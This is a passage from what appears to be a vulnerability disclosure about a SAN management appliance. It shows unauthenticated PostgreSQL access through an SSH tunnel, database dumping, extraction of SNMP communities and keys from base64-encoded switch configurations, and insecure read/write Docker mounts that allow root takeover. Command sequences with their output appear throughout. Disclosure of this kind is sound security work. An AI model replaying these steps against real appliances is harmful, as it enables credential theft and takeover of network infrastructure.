<span style="color: #666666">36</span>     <span style="color: #008000; font-weight: bold">public</span> <span style="color: #008000; font-weight: bold">static</span> <span style="color: #008000; font-weight: bold">final</span> String DATABASE <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;dcmdb&quot;</span><span style="color: #666666">;</span>
<span style="color: #666666">37</span>     <span style="color: #008000; font-weight: bold">public</span> <span style="color: #008000; font-weight: bold">static</span> <span style="color: #008000; font-weight: bold">final</span> String PORT <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;5432&quot;</span><span style="color: #666666">;</span>
<span style="color: #666666">38</span>     <span style="color: #008000; font-weight: bold">public</span> <span style="color: #008000; font-weight: bold">static</span> <span style="color: #008000; font-weight: bold">final</span> String FULL <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;full&quot;</span><span style="color: #666666">;</span>
<span style="color: #666666">39</span>     <span style="color: #008000; font-weight: bold">public</span> <span style="color: #008000; font-weight: bold">static</span> <span style="color: #008000; font-weight: bold">final</span> String PARTIAL <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;partial&quot;</span><span style="color: #666666">;</span>
</pre></div>

<p>Using a SSH tunnel, it is possible to get a full R/W access to the postgres databases without authentication from the host.</p>
<pre><code>kali% ssh -l root -L 5432:0.0.0.0:5432 10.13.3.7
kali% psql -d dcmdb -h 127.0.0.1 -U dcmadmin -p 5432 
psql (14.4 (Debian 14.4-1), server 9.5.24)
Type "help" for help.

dcmdb=# \l
                                 List of databases
   Name    |  Owner   | Encoding |  Collate   |   Ctype    |   Access privileges   
-----------+----------+----------+------------+------------+-----------------------
 dcmdb     | dcmadmin | UTF8     | en_US.utf8 | en_US.utf8 | =Tc/dcmadmin         +
           |          |          |            |            | dcmadmin=CTc/dcmadmin
 postgres  | dcmadmin | UTF8     | en_US.utf8 | en_US.utf8 | 
 template0 | dcmadmin | UTF8     | en_US.utf8 | en_US.utf8 | =c/dcmadmin          +
           |          |          |            |            | dcmadmin=CTc/dcmadmin
 template1 | dcmadmin | UTF8     | en_US.utf8 | en_US.utf8 | =c/dcmadmin          +
           |          |          |            |            | dcmadmin=CTc/dcmadmin
(4 rows)

dcmdb=#
</code></pre>
<p>An attacker can dump (or edit) the <code>dcmdb</code> database, storing the entire configuration of the appliance (admin credentials, credentials to switches, SNMP, ...)</p>
<p>It is worth noting that the database requires authentication when reaching the public IP of SANNav.</p>
<p>Extracting the Postgres database:</p>
<pre><code>kali% pg_dump -d dcmdb -h 127.0.0.1 -U dcmadmin | bzip2 -9 - &gt; dump.sql.bz2
</code></pre>
<p>The database contains encrypted credentials (that can be decrypted using Reverse Engineering on the java code) and credentials that are base64-ed.
Interestingly, some hashes for similar passwords are very similar, which is highly suspicious regarding the quality of the encryption mechanism.</p>
<p>Note: all the testing was performed on a test VM and all the values in the following dumps have been modified or redacted for clarity.</p>
<p>Content of the <code>user_</code> table:</p>
<pre><code>--
-- Data for Name: user_; Type: TABLE DATA; Schema: dcm; Owner: dcmadmin
--

COPY dcm.user_ (id, user_alias, first_name, last_name, tags, description, password, email, notification_enabled, phone_number, invalid_login_count, locked_out_
datetime, status, source_of_creation, skip_password_policy, last_modified_time, created_time) FROM stdin;
2       (System)        system user                     System user for internal use            \N      0               0       \N      1       0       0      
 2022-01-01 00:00:01   2022-01-01 00:00:01
3       admin                                   [REDACTED-HASHED-PASSWORD]
        0               2       \N  10       0       2022-01-01 00:00:01      2022-01-01 00:00:01
1       admin2   Admin                   admin2   [REDACTED-HASHED-PASSWORD]
        0           1   2022-01-01 00:00:01 1       0       0       2022-01-01 00:00:01      2022-01-01 00:00:01
\.
</code></pre>
<p>The table <code>user_</code> contains 2 encrypted passwords for the users.</p>
<p>We can also find hashes of previous passwords in the <code>password_history</code> table:</p>
<pre><code>--
-- Data for Name: password_history; Type: TABLE DATA; Schema: dcm; Owner: dcmadmin
--

COPY dcm.password_history (user_id, password_updated_datetime, previous_password) FROM stdin;
1       2022-01-01 00:00:01      [REDACTED-HASHED-PASSWORD]
3       2022-01-01 00:00:01      [REDACTED-HASHED-PASSWORD]
\.
</code></pre>
<p>It is also possible to extract the encrypted password used for the FTP server (inside the <code>ftp_server</code> table).</p>
<p>The read-only and read-write SNMP communities are available in clear-text in the <code>snmp_credentials</code> and <code>snmp_profile</code> tables:</p>
<pre><code>--
-- Data for Name: snmp_credentials; Type: TABLE DATA; Schema: dcm; Owner: dcmadmin
--

COPY dcm.snmp_credentials (id, virtual_switch_id, recipient_id, port_number, retry_count, timeout, version, read_community_string, write_community_string, user_name, context_name, auth_protocol, auth_password, priv_protocol, priv_password, snmp_informs_enabled) FROM stdin;
3       1       \N      161     3       5       v3                      [REDACTED-CLEAR-TEXT-SNMP-COMMUNITY]      \N       - None -                - None -                0
6       8       \N      161     3       5       v3                      [REDACTED-CLEAR-TEXT-SNMP-COMMUNITY]      \N       - None -                - None -                0
8       2       \N      161     3       5       v3                      [REDACTED-CLEAR-TEXT-SNMP-COMMUNITY]      VF:1  - None -                - None -                0
12      11      \N      161     3       5       v3                      [REDACTED-CLEAR-TEXT-SNMP-COMMUNITY]      VF:1  - None -                - None -                0
[...]

--
-- Data for Name: snmp_profile; Type: TABLE DATA; Schema: dcm; Owner: dcmadmin
--

COPY dcm.snmp_profile (name, port_number, retry_count, timeout, version, read_community_string, write_community_string, user_name, context_name, auth_protocol, auth_password, priv_protocol, priv_password, snmp_informs_enabled) FROM stdin;
defaultv3       161     3       5       v3                      [REDACTED-CLEAR-TEXT-SNMPv3-PASSWORD]              - None -                - None -                0
[...]
\.
</code></pre>
<p>Dumping the configuration of the switches from the <code>virtual_switch</code> table:</p>
<pre><code>--
-- Data for Name: virtual_switch; Type: TABLE DATA; Schema: dcm; Owner: dcmadmin
--

COPY dcm.virtual_switch (id, guid, logical_id, name, wwn, virtual_fabric_id, domain_id, base_switch, switch_mode, role, fcs_role, ad_capable, fabric_idid_mode, operational_status, max_zone_config_size, creation_time, last_update_time, user_name, password, management_state, state, status, status_reason, user_defined_value_1, user_defined_value_2, user_defined_value_3, core_switch_id, interop_mode, crypto_capable, fcr_capable, fcip_capable, fcoe_capable, l2_capable, l3_capable, lf_enabled, default_logical_switch, features_supported, fms_mode, dynamic_load_sharing, port_based_routing, in_order_delivery, insistent_did_mode, last_scan_time, domain_mode_239, domain_id_offset, previous_operational_status, fcoe_login_enabled, fcip_circuit_capable, discovered_port_count, last_port_membership_change, max_fcip_tunnels, max_fcip_circuits, fcip_licensed, addressing_mode, previous_state, managed_element_id, hif_enabled, auto_snmp, rnid_sequence_number, cluster_mode, vcs_id, cluster_type, rnid_tag, switch_id, monitored, features_enabled, maps_enabled_actions, routing_policy, fabric_status, protocol, bound, bound_bna_ip_address, access_gateway_oper_mode, edge_hold_time) FROM stdin;
1       f7054300-a413-4384-8c36-c0e9396b94c0    \N      SWITCH    10:00:88:[REDACTED] -1      12      0       0       Subordinate     None    1       0       HEALTHY 1828371 2022-01-01 00:00:01 2022-01-01 00:00:01 admin        [REDACTED-HASHED-PASSWORD]    0       Online  1       Switch Status is HEALTHY. Contributors: \N      \N           \N      1       0       0       0       0       0       0       0       0       1      263921   0       1       0       0       0       2022-01-01 00:00:01       96      HEALTHY 0       0       48      1798238743401   0            0       0       0       Online  2       0       1       0FFFFFFFFFFF    -1      -1      -1      0cef    16776204        1       91293   7121    3               1       0       \N      0       412     
[...]
</code></pre>
<p>The presence of the Switch World Wide Name (WWN) (10:00:88:FF:FF:FF:FF:FF) allows the exploitation of CVE-2022-33186.</p>
<p>The database also contains base64-encoded configuration of all the switches.</p>
<p>Extracting base64 content like a hacker:</p>
<pre><code>kali% bzgrep '==' dump.sql.bz2 &gt; test
</code></pre>
<p>Dump of the configuration of the Brocade switch:</p>
<pre><code>kali% for i in $(awk '{ print $8 }' test); do echo $i|base64 -d;echo;done|less
...
&gt;[Configuration upload Information]
[...]
snmp.agtParty.0.address:0.0.0.0
snmp.agtParty.0.address.default:0.0.0.0
snmp.agtParty.0.address_v6:0:0:0:0:0:0:0:0
snmp.agtParty.0.authPrivSecret:[REDACTED-CLEAR-TEXT-SNMP-COMMUNITY]
snmp.agtParty.0.authPrivSecret.default:Secret C0de
snmp.agtParty.0.index:1
snmp.agtParty.0.index.default:1
snmp.agtParty.0.trapSeverityLevel:0
snmp.agtParty.0.trapSeverityLevel.default:0
snmp.agtParty.0.trapport:162
snmp.agtParty.0.trapport.default:162
snmp.agtParty.1.address:0.0.0.0
snmp.agtParty.1.address.default:0.0.0.0
snmp.agtParty.1.address_v6:0:0:0:0:0:0:0:0
snmp.agtParty.1.authPrivSecret:[REDACTED-CLEAR-TEXT-SNMP-COMMUNITY]
snmp.agtParty.1.authPrivSecret.default:OrigEquipMfr
snmp.agtParty.1.index:2
snmp.agtParty.1.index.default:2
snmp.agtParty.1.trapSeverityLevel:0
[...]
</code></pre>
<p>Regarding these SNMP communities, they are known backdoor SNMP communities for Brocade switches:</p>
<p><a href="https://techdocs.broadcom.com/us/en/fibre-channel-networking/fabric-os/fabric-os-web-tools/9-1-x/v26882500/v26815803/v26850344.html">https://techdocs.broadcom.com/us/en/fibre-channel-networking/fabric-os/fabric-os-web-tools/9-1-x/v26882500/v26815803/v26850344.html</a>:</p>
<p><img alt="" src="images/2024-sannav-snmp.png" /></p>
<p>It is then possible to extract all the SNMP communities and compromise the switches:</p>
<pre><code>snmp.agtParty.0.authPrivSecret:[REDACTED-CLEAR-TEXT-SNMP-COMMUNITY]
snmp.agtParty.0.authPrivSecret.default:Secret C0de
snmp.agtParty.1.authPrivSecret:[REDACTED-CLEAR-TEXT-SNMP-COMMUNITY]
snmp.agtParty.1.authPrivSecret.default:OrigEquipMfr
snmp.agtParty.2.authPrivSecret:[REDACTED-CLEAR-TEXT-SNMP-COMMUNITY]
snmp.agtParty.2.authPrivSecret.default:private
snmp.agtParty.3.authPrivSecret:[REDACTED-CLEAR-TEXT-SNMP-COMMUNITY]
snmp.agtParty.3.authPrivSecret.default:public
snmp.agtParty.4.authPrivSecret:[REDACTED-CLEAR-TEXT-SNMP-COMMUNITY]
snmp.agtParty.4.authPrivSecret.default:common
snmp.agtParty.5.authPrivSecret:[REDACTED-CLEAR-TEXT-SNMP-COMMUNITY]
snmp.agtParty.5.authPrivSecret.default:FibreChannel
</code></pre>
<p>And SNMP3 keys (the keys have been redacted):</p>
<pre><code>kali% for i in $(awk '{ print $8 }' test); do echo $i|base64 -d;echo;done 2&gt;/dev/null|grep usmAuthKey
snmp.snmpv3Keys.3.usmAuthKey:ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
snmp.snmpv3Keys.3.usmAuthKeySize:50
snmp.snmpv3Keys.4.usmAuthKey:ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
snmp.snmpv3Keys.4.usmAuthKeySize:50
snmp.snmpv3Keys.5.usmAuthKey:ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
snmp.snmpv3Keys.5.usmAuthKeySize:50
snmp.snmpv3Keys.0.usmAuthKey:ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
snmp.snmpv3Keys.0.usmAuthKeySize:50
snmp.snmpv3Keys.1.usmAuthKey:ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
snmp.snmpv3Keys.1.usmAuthKeySize:50
snmp.snmpv3Keys.2.usmAuthKey:ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
snmp.snmpv3Keys.2.usmAuthKeySize:50
snmp.snmpv3Keys.3.usmAuthKey:ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
snmp.snmpv3Keys.3.usmAuthKeySize:50

kali% for i in $(awk '{ print $8 }' test); do echo $i|base64 -d;echo;done 2&gt;/dev/null|grep usmAuthSecret|sort|uniq
snmp.snmpv3Usm.0.usmAuthSecret:[REDACTED-CLEAR-TEXT-SNMPv3-PASSWORD]
snmp.snmpv3Usm.0.usmAuthSecret.default:adminpasswd1
snmp.snmpv3Usm.1.usmAuthSecret:[REDACTED-CLEAR-TEXT-SNMPv3-PASSWORD]
snmp.snmpv3Usm.1.usmAuthSecret.default:adminpasswd2
snmp.snmpv3Usm.2.usmAuthSecret:[REDACTED-CLEAR-TEXT-SNMPv3-PASSWORD]
[...]
</code></pre>
<p><a id="insecure-postgres-docker-instance"></a></p>
<h2>Details - Insecure Postgres Docker instance</h2>
<p>The Postgres Docker instance is extremely insecure.</p>
<p>When analyzing the partitions inside this Docker instance, we can find several Read/Write mount points, allowing overwriting critical files in the host:</p>
<pre><code>[root@sannav-portal-v211 ~]# docker ps | grep post
f40c5f57fa49        10.13.3.7:5000/dcm-postgres-db:sann2.1.1                   "docker-entrypoint.    4 months ago        Up 4 months                             dcm_2_1_1_dcm-postgres-db.1.mcdp2z3lp34d5isihk8lu6o6h
[root@sannav-portal-v211 ~]# docker exec -it f40c5f57fa49 bash
root@sannav-portal-v211:/# mount | grep sdb1
/dev/sdb1 on /dcm1.0.0/sannav_support_data type ext4 (rw,relatime,seclabel)
/dev/sdb1 on /dcm1.0.0/lib type ext4 (rw,relatime,seclabel)
/dev/sdb1 on /dcm1.0.0/jre type ext4 (rw,relatime,seclabel)
/dev/sdb1 on /dcm1.0.0/backuprestore type ext4 (rw,relatime,seclabel)
/dev/sdb1 on /etc/hosts type ext4 (rw,relatime,seclabel)
/dev/sdb1 on /dcm1.0.0/temp type ext4 (rw,relatime,seclabel)
/dev/sdb1 on /etc/hostname type ext4 (rw,relatime,seclabel)
/dev/sdb1 on /etc/resolv.conf type ext4 (rw,relatime,seclabel)
/dev/sdb1 on /dcm1.0.0/conf/postgres type ext4 (rw,relatime,seclabel)
/dev/sdb1 on /dcm1.0.0/data/reports type ext4 (rw,relatime,seclabel)
/dev/sdb1 on /dcm1.0.0/conf/server.properties type ext4 (rw,relatime,seclabel)
/dev/sdb1 on /var/lib/postgresql/data type ext4 (rw,relatime,seclabel)
root@sannav-portal-v211:/#
</code></pre>
<p>These mount points are read/write.</p>
<p>Output of the <code>docker inspect</code> command:</p>
<pre><code>"Mounts": [
    {
        "Type": "bind",
        "Source": "/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/data/reports",
        "Destination": "/dcm1.0.0/data/reports",
        "Mode": "",
        "RW": true,
        "Propagation": "rprivate"
    },
    {
        "Type": "bind",
        "Source": "/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/database/dcm_db/data",
        "Destination": "/var/lib/postgresql/data",
        "Mode": "",
        "RW": true,
        "Propagation": "rprivate"
    },
    {
        "Type": "bind",
        "Source": "/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/conf/postgres",
        "Destination": "/dcm1.0.0/conf/postgres",
        "Mode": "",
        "RW": true,
        "Propagation": "rprivate"
    },
    {
        "Type": "bind",
        "Source": "/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/lib",
        "Destination": "/dcm1.0.0/lib",
        "Mode": "",
        "RW": true,
        "Propagation": "rprivate"
    },
    {
        "Type": "bind",
        "Source": "/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/jre",
        "Destination": "/dcm1.0.0/jre",
        "Mode": "",
        "RW": true,
        "Propagation": "rprivate"
    },
    {
        "Type": "bind",
        "Source": "/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/conf/server.properties",
        "Destination": "/dcm1.0.0/conf/server.properties",
        "Mode": "",
        "RW": true,
        "Propagation": "rprivate"
    },
    {
        "Type": "bind",
        "Source": "/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/temp",
        "Destination": "/dcm1.0.0/temp",
        "Mode": "",
        "RW": true,
        "Propagation": "rprivate"
    },
    {
        "Type": "bind",
        "Source": "/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/sannav_support_data",
        "Destination": "/dcm1.0.0/sannav_support_data",
        "Mode": "",
        "RW": true,
        "Propagation": "rprivate"
    },
    {
        "Type": "bind",
        "Source": "/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/backuprestore",
        "Destination": "/dcm1.0.0/backuprestore",
        "Mode": "",
        "RW": true,
        "Propagation": "rprivate"
    }
],
</code></pre>
<p>This allows an attacker to exftiltrate backup files:</p>
<pre><code>[root@sannav-portal-v211:/# ls -la /dcm1.0.0/backuprestore
total 27784
drwxr-xr-x+ 2 1000 1000     4096 Aug  5 09:27 .
drwxr-xr-x. 1 root root     4096 Mar 31 18:54 ..
-rw-rw-r--+ 1 root root 29238172 Jan  1  2022 dcm-cli-ondemand-backup-01-01-2022-01-14-56.tar.gz
root@sannav-portal-v211:/#
</code></pre>
<p>This also allows overwriting the Java Runtime Environment (JRE) located in <code>/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/jre</code>. These programs are used in the host system and in Docker instances (if the attacker achieves a LPE inside the Docker instance).</p>
<p>R/W access to the JRE files from the Docker instance:</p>
<pre><code>[root@sannav-portal-v211:/# ls -la /dcm1.0.0/jre
total 236 
drwxr-xr-x+  5 1000 1000   4096 Nov  9  2020 .
drwxr-xr-x.  1 root root   4096 Mar 31 18:54 ..
-r--r--r--+  1 1000 1000   1522 Nov  9  2020 ASSEMBLY_EXCEPTION
drwxr-xr-x+  2 1000 1000   4096 Dec 15  2020 bin 
drwxr-xr-x+ 10 1000 1000   4096 Dec 15  2020 lib 
-r--r--r--+  1 1000 1000  19274 Nov  9  2020 LICENSE
drwxr-xr-x+  4 1000 1000   4096 Nov  9  2020 man 
-rw-r--r--+  1 1000 1000    325 Nov  9  2020 release
-r--r--r--+  1 1000 1000 154987 Nov  9  2020 THIRD_PARTY_README
root@sannav-portal-v211:/#
</code></pre>
<p>When checking the configuration of postgres, we can confirm no authentication is required when connecting to locahost.</p>
<p>Configuration file of Postgres:</p>
<pre><code>[root@sannav-portal-v211 data]# cat /sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/database/dcm_db/data/pg_hba.conf

# CAUTION: Configuring the system for local "trust" authentication
# allows any local user to connect as any PostgreSQL user, including
# the database superuser.  If you do not trust all your local users,
# use another authentication method.


# TYPE  DATABASE        USER            ADDRESS                 METHOD

# "local" is for Unix domain socket connections only
local   all             all                                     trust
# IPv4 local connections:
host    all             all             127.0.0.1/32            trust
# IPv6 local connections:
host    all             all             ::1/128                 trust
# Allow replication connections from localhost, by a user with the 
# replication privilege.
#local   replication     dcmadmin                                trust
#host    replication     dcmadmin        127.0.0.1/32            trust
#host    replication     dcmadmin        ::1/128                 trust

host all all all md5
</code></pre>
<p>Furthermore, the version of Posgres (9.5) is EOL since February 2021:</p>
<pre><code>[root@sannav-portal-v211 data]# cat /sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/database/dcm_db/data/PG_VERSION 
9.5
</code></pre>
<p><a id="insecure-docker-instances"></a></p>
<h2>Details - Insecure Docker instances</h2>
<p>An attacker with access to a Docker instance inside the appliance can take over the appliance by replacing binaries in the <code>/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/jre</code> or the <code>/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/bin</code> directory. The scripts in the bin directory are executed as root on the main host.</p>
<p>Any Docker instance can edit the configuration of the appliance or logs.</p>
<p>Docker instances inside the appliance have insecure mount points, allowing to get read and write access to sensitive files in the main host.</p>
<p>The <code>dcm_2_1_1_cadvisor.1.f5w5yy6zifoa8zh3lc9iuzpo</code> Docker instance has a full read access to the <code>/sannav-portal-v211/docker-home</code> directory, containing the file systems of all the Docker instances.</p>
<p>Output of the <code>docker inspect</code> command of <code>dcm_2_1_1_cadvisor.1.f5w5yy6zifoa8zh3lc9iuzpo</code>:</p>
<pre><code>        {
            "Type": "bind",
            "Source": "/sannav-portal-v211/docker-home",
            "Destination": "/sannav-portal-v211/docker-home",
            "Mode": "",
            "RW": false,
            "Propagation": "rslave"
        },
</code></pre>
<p>It also has a read access of all the configuration files present in <code>/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184</code>.</p>
<p>Output of the <code>docker inspect</code> command of <code>dcm_2_1_1_cadvisor.1.f5w5yy6zifoa8zh3lc9iuzpo</code>:</p>
<pre><code>        {
            "Type": "bind",
            "Source": "/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184",
            "Destination": "/rootfs",
            "Mode": "",
            "RW": false,
            "Propagation": "rprivate"
        },
</code></pre>
<p>Using a shell script to automatically analyze the mount points, we can find several Docker instances with Read/Write access to critical mount points inside the host.</p>
<p>Script shell analyzing the outputs of <code>docker inspect</code> commands:</p>
<pre><code>kali% cat mount.sh 
#!/bin/sh

for j in $(cat mount.txt)
do
  echo
  echo $j
  for i in ????????????
  do
    cat $i | jq -r '.[].Mounts' | grep -A 3 ${j}  | grep '"RW": true,' &gt;/dev/null &amp;&amp; echo -n "  " &amp;&amp; cat $i | jq -r '.[].Name'
  done
done
kali% cat mount.txt 
"/etc/DCM",
"/etc/localtime",
"/sannav-portal-v211/docker-home",
"/sannav-portal-v211/docker-home/volumes/36ea39870a237eb840244f54544a450cd25f92d218d91baf05ae8ab69a9a6a69/_data",
"/sannav-portal-v211/docker-home/volumes/4fc3604e269692b4c5938ee499920ecc7475962bdb76cd413116395f43ee6c17/_data",
"/sannav-portal-v211/docker-home/volumes/5a07f65a4f67ce29ed5b2bc91f229065aa160a916b79f713209472146d0e060a/_data",
"/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184",
"/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/backuprestore",
"/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/bin",
"/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/bin/backuprestore",
"/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/compose",
"/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/conf",
"/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/conf/elasticsearch/jvm.options",
"/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/conf/nginx",
"/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/conf/nginx/nginx.conf",
"/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/conf/postgres",
"/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/conf/prometheus",
"/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/conf/reportgenerator",
"/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/conf/server.properties",
"/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/conf/wso2",
"/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/database",
"/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/database/dcm_db/data",
"/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/data/callHome",
"/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/data/callHome/report/syr",
"/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/data/filetransfer",
"/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/data/prometheus",
"/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/data/reports",
"/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/elasticsearch/data",
"/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/elasticsearch/esdump",
"/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/elasticsearch/logs",
"/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/jre",
"/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/kafka/certs/caroot",
"/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/kafka/certs/keystore",
"/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/kafka/data/kafka-1/data",
"/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/kafka/data/kafka-1/txlogs",
"/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/lib",
"/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/logs",
"/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/logs/ignite-grid-node1",
"/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/logs/kafka-1",
"/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/logs/nginx",
"/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/logs/schema-registry",
"/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/logs/wso2",
"/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/logs/zookeeper",
"/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/report",
"/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/sannav_support_data",
"/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/swidtag",
"/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/temp",
"/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/zookeeper/data/zookeeper/data",
"/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/zookeeper/data/zookeeper/txlogs",
"/sys",
"/tmp",
"/tmp/",
"/var/run",
"/var/run/docker.sock",
kali% ls
01f7ea512934  2251bfba8694  3c99644999f0  58098f967ab8  6d72af69c4b1  884be1248e33  b4974a50c49e
bee9fe555098  dfda143af911  f22345536257  f90d98e286ae  12647d5f93ea  2dd6e08889e8  40fa36431ed2
5f67b59a6a74  7be8c664392f  8ab3c851aec8  b6a43751ee5d  cc9c3b6ec2d9  _done         f40c5f57fa49
mount.sh      1c3d9fb1a33d  31de96fd6889  44ab73ba64b7  675c364f5167  82eaab1235cc  9942a51dc33f
b81a84ad73f4  cd1ca666073b  ed28962ee9a4  f41e098298c0  mount.txt     20f193d756ca  35fab5566b1c
5228116a416e  67f747dafd14  871cc736d56d  99ee9d76a50a  bdf543f123c9  d5d671ef3467  efe5fcd3cef2
f5705f9fef27
kali% ./mount.sh
"/etc/DCM",
  /dcm_2_1_1_license-mw.1.zs0l6gi0ciqw62cu2ql996biu
  [...]
</code></pre>
<p>The <code>mount.sh</code> script will output insecure mount points:</p>
<p>R/W Access to <code>/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/backuprestore</code>:</p>
<ul>
<li>/dcm_2_1_1_backuprestore-mw.1.zpqqmm5dxjwpd5vbaa91iqu9x</li>
<li>/dcm_2_1_1_dcm-postgres-db.1.mcdp2z3lp34d5isihk8lu6o6h</li>
</ul>
<p>R/W Access to <code>/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/bin</code>:</p>
<ul>
<li>/dcm_2_1_1_dashboard-summaryprovider.1.u8uha7mufvmfphnwmanrzthgv</li>
<li>/dcm_2_1_1_fe-consolidated-1.1.cwc8pmrcwob0sivongcnw8o8m</li>
<li>/dcm_2_1_1_faultmanagement-backend.1.ke6t2o5dtv1ieg41xw28r4q82</li>
<li>/dcm_2_1_1_ignite-grid-object-manager-node.1.knfke4xd2rutww916akawx0x4</li>
<li>/dcm_2_1_1_filters-contextsearch-middleware.1.tziel666fllkwfj1trxky958y</li>
<li>/dcm_2_1_1_authentication-rbac-middleware.1.d19zdz97oeaexukqqdo762vsp</li>
<li>/dcm_2_1_1_supportsave-mw.1.8k4nf2oed3rlmn00vk2c6udmp</li>
<li>/dcm_2_1_1_asyncjobscheduler-worker.1.u74e1dapsggi7tvl6cost8fgs</li>
<li>/dcm_2_1_1_license-mw.1.zs0l6gi0ciqw62cu2ql996biu</li>
<li>/dcm_2_1_1_externalapi-middleware.1.loovm2l8nx5y31mbuj5609u7r</li>
<li>/dcm_2_1_1_performancemanagement-datastore.1.qjfrhpjgsv8wfebsx29c2jg6b</li>
<li>/dcm_2_1_1_reportgenerator.1.43z628e4fvtyahtd4c7q5l12l</li>
<li>/dcm_2_1_1_troubleshooting.1.tpipiw85xeojvc0syotzwabrs</li>
<li>/dcm_2_1_1_cfgmgmt-policy-middleware.1.q2d4eh0y3to2gc4req6wpw98j</li>
<li>/dcm_2_1_1_performancemanagement-statscollector.1.0bgfuh1nq4j7bib7fk6jwuvlj</li>
<li>/dcm_2_1_1_performancemanagement-middleware.1.m6wzmc73pgg26gwuhmpg1l74x</li>
<li>/dcm_2_1_1_switch-filetransfer-mw.1.ausaed37uog9jnzyxsrxgkmuo</li>
<li>/dcm_2_1_1_topology-middleware.1.tm0jcogi1oir1ufhy91m1pqqu</li>
<li>/dcm_2_1_1_flow-management-mw.1.jadot7kerrt6ywappso7khj86</li>
<li>/dcm_2_1_1_dashboard-middleware.1.0xas72iwheca6ix3axzeymqm1</li>
<li>/dcm_2_1_1_asyncjobscheduler-manager.1.v9bqrdh28ohchqpxmmwttejsd</li>
<li>/dcm_2_1_1_backuprestore-mw.1.zpqqmm5dxjwpd5vbaa91iqu9x</li>
<li>/dcm_2_1_1_g-agent.1.vaegzwy7vgmq7h0njq66fpso6</li>
<li>/dcm_2_1_1_collections-middleware.1.sg938jedpz5ca3n0c5pp0ynhi</li>
<li>/dcm_2_1_1_switch-asset-collectors-mw.1.38bqty706b9lvkbmn9ioegzkb</li>
<li>/dcm_2_1_1_fe-consolidated-2.1.ok1xeb9agbpjmkv1kes43cxdq</li>
<li>/dcm_2_1_1_filetransfer.1.uh461uxa4oa6fgrt1rsz1hac5</li>
<li>/dcm_2_1_1_faultmanagement-collector.1.mg7typw8ef0ph69itrahoes0m</li>
</ul>
<p>R/W Access to <code>/sannav-portal-v211/sannav-home/Portal_2.1.1_bld184/conf</code>:</p>
<ul>
<li>/dcm_2_1_1_dashboard-summaryprovider.1.u8uha7mufvmfphnwmanrzthgv</li>
<li>/dcm_2_1_1_fe-consolidated-1.1.cwc8pmrcwob0sivongcnw8o8m</li>
<li>/dcm_2_1_1_faultmanagement-backend.1.ke6t2o5dtv1ieg41xw28r4q82</li>
<li>/dcm_2_1_1_system-monitor.1.g6x4tf6jqfalrf0khluopbxdy</li>
<li>/dcm_2_1_1_ignite-grid-object-manager-node.1.knfke4xd2rutww916akawx0x4</li>
<li>/dcm_2_1_1_filters-contextsearch-middleware.1.tziel666fllkwfj1trxky958y</li>
